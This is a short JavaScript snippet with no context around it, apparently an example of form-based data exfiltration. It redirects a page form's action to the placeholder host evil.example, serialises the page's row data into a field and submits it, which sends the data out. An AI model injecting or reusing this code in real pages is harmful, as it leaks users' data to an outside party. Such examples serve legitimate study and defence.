const f = document.getElementById('f');
f.action = 'https://evil.example/c';
f.d.value = JSON.stringify(window.rows);
f.submit();
